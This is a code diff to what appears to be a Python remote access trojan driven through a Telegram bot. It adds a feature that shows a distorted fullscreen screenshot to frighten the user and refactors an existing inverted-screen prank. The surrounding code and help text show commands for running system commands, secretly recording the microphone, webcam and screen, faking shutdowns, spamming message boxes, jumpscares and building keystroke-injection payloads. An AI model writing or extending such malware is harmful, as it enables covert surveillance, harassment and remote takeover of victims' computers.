@@ -11,7 +11,7 @@ from PIL import Image
 from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
-                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not)
+                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -32,13 +32,13 @@ import socket
 import traceback
 import pyautogui as pg
 import subprocess as sp
-from random import choice
 from re import findall, M
 from time import time, sleep
 from threading import Thread
 from datetime import datetime
 from typing import Any, Callable
 from io import BytesIO, StringIO
+from random import choice, randint
 from string import ascii_letters, printable
 from webbrowser import open as browseropen
 from platform import system as platform_system
@@ -124,6 +124,7 @@ messagebox - Show a custom message box.
 messagespam - Spam message boxes.  
 fakeshutdown - Fake system shutdown.  
 invertedscreen - Shows inverted colors screenshot.
+distortedscreen - Shows distorted screenshot.
 execute - Run system command.  
 microphone - Record mic audio.  
 browser - Open URL in browser.
@@ -185,16 +186,26 @@ def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30)
     compressed_image = np.array(Image.open(buffer))
     return compressed_image
 
-def show_image_fullscreen(image) -> None:
+def show_image_fullscreen(image, timeout=1250) -> None:
     namedWindow("FullScreenImage", WND_PROP_FULLSCREEN)
     setWindowProperty("FullScreenImage", WND_PROP_TOPMOST, 1)
     setWindowProperty("FullScreenImage", WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN)
     imshow("FullScreenImage", image) 
-    waitKey(1250)
+    waitKey(timeout)
     destroyAllWindows()
 
 def invert_image(imagearray:np.array) -> np.array:
     return bitwise_not(imagearray)
+
+def distorted_screen(image, strength=5, frequency=50):
+    h, w, _ = image.shape
+    map_x, map_y = np.meshgrid(np.arange(w, dtype=np.float32), np.arange(h, dtype=np.float32))
+
+    map_x += np.sin(map_y / frequency) * strength
+    map_y += np.cos(map_x / frequency) * strength
+
+    distorted = remap(image, map_x, map_y, interpolation=INTER_LINEAR, borderMode=BORDER_REFLECT)
+    return distorted
 
 def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
     if not FACERECOGNITION:
@@ -287,6 +298,8 @@ def toducky(payload) -> str:
         final += "\n"
 
     return(final.replace("pg.hotkey)\n", ""))
+
+
 class ButtonsMenu:
     def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0) -> None:
         self.bot = bot
@@ -462,6 +475,17 @@ class LoadingBar:
         self.progress = self.tot
         self.update()
 
+"""
+ooooooooo.     .oooooo.   ooooooooo.
+`888   `Y88.  d8P'  `Y8b  `888   `Y88.
+ 888   .d88' 888           888   .d88'  .ooooo.  oo.ooooo.
+ 888ooo88P'  888           888ooo88P'  d88' `88b  888' `88b
+ 888`88b.    888           888         888ooo888  888   888
+ 888  `88b.  `88b    ooo   888         888    .o  888   888
+o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
+                                                  888
+                                                 o888o
+"""
 class PeppinoTelegram:
     def __init__(self, token: str, owner_id: int) -> None:
         self.token = token
@@ -501,6 +525,7 @@ class PeppinoTelegram:
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
             "invertedscreen":self.inverted_screen,
+            "distortedscreen":self.distorted_screen,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
@@ -876,12 +901,18 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         self.__play_loaded_sound("breath")
     
     def inverted_screen(self) -> None:
+        self.modded_screenshot(invert_image)
+    
+    def distorted_screen(self) -> None:
+        self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))
+
+    def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
         filename = join(BURN_DIRECTORY, randompngname())
         pg.screenshot(filename)
         img = imread(filename)
-        inverted_img = invert_image(img)
-        show_image_fullscreen(inverted_img)
-    
+        modded_img = effect(img)
+        show_image_fullscreen(modded_img, timeout)
+
     def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True) -> None:
         set_volume(100)
         if image is None:
